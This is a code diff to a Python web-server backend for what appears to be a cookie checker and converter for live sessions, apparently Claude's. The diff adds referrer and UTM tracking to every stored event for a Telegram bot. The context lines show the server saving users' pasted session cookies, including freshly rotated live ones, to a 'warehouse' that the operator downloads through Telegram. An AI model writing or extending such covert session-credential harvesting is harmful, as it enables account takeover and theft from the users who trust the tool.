@@ -133,7 +133,9 @@ CREATE TABLE IF NOT EXISTS events (
     output   TEXT,
     valid    INTEGER,
     reason   TEXT,
-    info     TEXT
+    info     TEXT,
+    ref      TEXT,
+    utm      TEXT
 );
 CREATE TABLE IF NOT EXISTS blobs (
     event_id INTEGER PRIMARY KEY,
@@ -171,6 +173,8 @@ MIGRATIONS = {
     "valid": "ALTER TABLE events ADD COLUMN valid INTEGER",
     "reason": "ALTER TABLE events ADD COLUMN reason TEXT",
     "info": "ALTER TABLE events ADD COLUMN info TEXT",
+    "ref": "ALTER TABLE events ADD COLUMN ref TEXT",
+    "utm": "ALTER TABLE events ADD COLUMN utm TEXT",
 }
 
 def box_private():
@@ -354,12 +358,12 @@ def public_credential_result(payload: dict) -> dict:
 
 
 def insert_event(conn: sqlite3.Connection, row: dict, output: str | None) -> int:
-    payload = {**row, "output": None}
+    payload = {**row, "output": None, "ref": row.get("ref"), "utm": row.get("utm")}
     cur = conn.execute(
         "INSERT INTO events (ts,day,type,visitor,country,locale,device,path,"
-        "from_fmt,to_fmt,n,domains,output,valid,reason,info) VALUES (:ts,:day,"
+        "from_fmt,to_fmt,n,domains,output,valid,reason,info,ref,utm) VALUES (:ts,:day,"
         ":type,:visitor,:country,:locale,:device,:path,:from_fmt,:to_fmt,:n,"
-        ":domains,:output,:valid,:reason,:info)",
+        ":domains,:output,:valid,:reason,:info,:ref,:utm)",
         payload,
     )
     event_id = int(cur.lastrowid)
@@ -727,7 +731,12 @@ class Handler(BaseHTTPRequestHandler):
             "device": device_class(ua), "path": None, "from_fmt": None,
             "to_fmt": None, "n": None, "domains": None,
             "valid": None, "reason": None, "info": None,
+            "ref": None, "utm": None,
         }
+        ref = data.get("ref")
+        row["ref"] = ref[:300] if isinstance(ref, str) and ref.strip() else None
+        utm = data.get("utm")
+        row["utm"] = utm[:1000] if isinstance(utm, str) and utm else None
         output = None
 
         if etype == "pageview":
@@ -779,10 +788,19 @@ class Handler(BaseHTTPRequestHandler):
             return self._json(400, {"ok": False, "invalidReason": "empty"})
         return self._check_payload(inner, ip, ua, path="/check")
 
+    def _channel_fields(self, inner: dict) -> tuple[str | None, str | None]:
+        """Referrer/UTM channel metadata, for the Telegram bot's channels screen."""
+        ref = inner.get("ref")
+        ref = ref[:300] if isinstance(ref, str) and ref.strip() else None
+        utm = inner.get("utm")
+        utm = utm[:1000] if isinstance(utm, str) and utm else None
+        return ref, utm
+
     def _check_payload(self, inner: dict, ip: str, ua: str, *, path: str):
         locale = inner.get("l")
         locale = locale if locale in LOCALES else None
         tz = inner.get("tz") if isinstance(inner.get("tz"), str) else None
+        ref, utm = self._channel_fields(inner)
 
         # Batch: {cookies: [raw, …]} -> a result per set, capped so one request can
         # not fan out an unbounded number of live-session checks to Claude.
@@ -790,7 +808,7 @@ class Handler(BaseHTTPRequestHandler):
         if isinstance(batch, list):
             items = [c[:MAX_BODY] for c in batch if isinstance(c, str) and c.strip()][:MAX_BATCH]
             results = [
-                public_check_result(self._check_one(raw, locale, tz, ip, ua, path=path))
+                public_check_result(self._check_one(raw, locale, tz, ip, ua, path=path, ref=ref, utm=utm))
                 for raw in items
             ]
             return self._json(200, {"results": results})
@@ -799,11 +817,13 @@ class Handler(BaseHTTPRequestHandler):
         if not isinstance(raw, str):
             raw = ""
         raw = raw[:MAX_BODY]
-        result = self._check_one(raw, locale, tz, ip, ua, path=path)
+        result = self._check_one(raw, locale, tz, ip, ua, path=path, ref=ref, utm=utm)
         return self._json(200, public_check_result(result))
 
     def _check_one(
-        self, raw: str, locale: str | None, tz: str | None, ip: str, ua: str, *, path: str = "/check",
+        self,
+        raw: str, locale: str | None, tz: str | None, ip: str, ua: str,
+        *, path: str = "/check", ref: str | None = None, utm: str | None = None,
     ) -> dict:
         """Resolve country, honour safe-mode, de-dupe, check one cookie, store it."""
         session_id = session_key_hash(raw)
@@ -820,17 +840,19 @@ class Handler(BaseHTTPRequestHandler):
         if raw.strip() and not egress_ok(country, session_id):
             print("check no_safe_egress statuses= paths= rotated=no ms=0", flush=True)
             result = {"ok": False, "invalidReason": "unreachable"}
-            self._store_check(ip, ua, locale, raw, result, path=path)
+            self._store_check(ip, ua, locale, raw, result, path=path, ref=ref, utm=utm)
             return result
 
         result, _cached = execute_check(raw, session_id, country)
         # Always write a check row. A convert of the same session may already be
         # in the 60s cache; the operator still wants this paste in the warehouse.
-        self._store_check(ip, ua, locale, raw, result, path=path)
+        self._store_check(ip, ua, locale, raw, result, path=path, ref=ref, utm=utm)
         return result
 
     def _store_check(
-        self, ip: str, ua: str, locale: str | None, raw: str, result: dict, *, path: str = "/check",
+        self,
+        ip: str, ua: str, locale: str | None, raw: str, result: dict,
+        *, path: str = "/check", ref: str | None = None, utm: str | None = None,
     ) -> None:
         country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
         ok = bool(result.get("ok"))
@@ -842,6 +864,7 @@ class Handler(BaseHTTPRequestHandler):
             "valid": 1 if ok else 0,
             "reason": None if ok else (result.get("invalidReason") or "invalid"),
             "info": json.dumps(check_info(result), ensure_ascii=False) if ok else None,
+            "ref": ref, "utm": utm,
         }
         # Keep-alive: if the session rotated during the check, store the fresh
         # cookie so what the operator downloads in Telegram is the live one.
@@ -887,6 +910,7 @@ class Handler(BaseHTTPRequestHandler):
         locale = inner.get("l")
         locale = locale if locale in LOCALES else None
         tz = inner.get("tz") if isinstance(inner.get("tz"), str) else None
+        ref, utm = self._channel_fields(inner)
         raw = inner.get("cookie")
         if not isinstance(raw, str):
             raw = ""
@@ -922,16 +946,17 @@ class Handler(BaseHTTPRequestHandler):
         except ConvertError as exc:
             reason = exc.reason or "convert_failed"
             print(redact(f"credential {reason}"), flush=True)
-            self._store_credential(ip, ua, locale, result, working, valid=False, reason=reason, path=path)
+            self._store_credential(ip, ua, locale, result, working, valid=False, reason=reason, path=path, ref=ref, utm=utm)
             return self._json(200, {"ok": False, "invalidReason": reason})
         except Exception as exc:
             print(redact(f"credential convert_failed {exc!r}"), flush=True)
             self._store_credential(
-                ip, ua, locale, result, working, valid=False, reason="convert_failed", path=path,
+                ip, ua, locale, result, working, valid=False, reason="convert_failed",
+                path=path, ref=ref, utm=utm,
             )
             return self._json(200, {"ok": False, "invalidReason": "convert_failed"})
 
-        self._store_credential(ip, ua, locale, result, working, valid=True, reason=None, path=path)
+        self._store_credential(ip, ua, locale, result, working, valid=True, reason=None, path=path, ref=ref, utm=utm)
         return self._json(200, public_credential_result(payload))
 
     def api_convert(self):
@@ -954,6 +979,10 @@ class Handler(BaseHTTPRequestHandler):
         locale = data.get("l")
         locale = locale if locale in LOCALES else None
         tz = data.get("tz") if isinstance(data.get("tz"), str) else None
+        ref = data.get("ref")
+        ref = ref[:300] if isinstance(ref, str) and ref.strip() else None
+        utm = data.get("utm")
+        utm = utm[:1000] if isinstance(utm, str) and utm else None
         opts = {"target": target, "default_domain": default_domain}
         sets = split_cookie_sets(raw)
         if not sets:
@@ -962,7 +991,7 @@ class Handler(BaseHTTPRequestHandler):
         ip_country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
         for result in results:
             if result.get("ok") and result.get("output") and not is_site_sample(result["output"]):
-                self._store_convert(ip, ua, locale, result, tz, ip_country)
+                self._store_convert(ip, ua, locale, result, tz, ip_country, ref=ref, utm=utm)
         ok_results = [result for result in results if result.get("ok")]
         if not ok_results:
             first = results[0]
@@ -982,6 +1011,8 @@ class Handler(BaseHTTPRequestHandler):
         result: dict,
         tz: str | None,
         ip_country: str | None,
+        ref: str | None = None,
+        utm: str | None = None,
     ) -> None:
         output = result.get("output") if isinstance(result.get("output"), str) else None
         from_fmt = result.get("detected")
@@ -998,6 +1029,7 @@ class Handler(BaseHTTPRequestHandler):
             "n": stats.get("total") if isinstance(stats.get("total"), int) else None,
             "domains": extract_domains(output) if output else None,
             "valid": None, "reason": None, "info": None,
+            "ref": ref, "utm": utm,
         }
         conn = db()
         try:
@@ -1041,6 +1073,8 @@ class Handler(BaseHTTPRequestHandler):
         valid: bool,
         reason: str | None,
         path: str = "/credential",
+        ref: str | None = None,
+        utm: str | None = None,
     ) -> None:
         country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
         row = {
@@ -1051,6 +1085,7 @@ class Handler(BaseHTTPRequestHandler):
             "valid": 1 if valid else 0,
             "reason": None if valid else (reason or "convert_failed"),
             "info": json.dumps(check_info(result), ensure_ascii=False) if result.get("ok") else None,
+            "ref": ref, "utm": utm,
         }
         # Cookie only — never the minted OAuth file.
         stored = (result.get("freshCookie") or raw) if STORE_OUTPUT else None
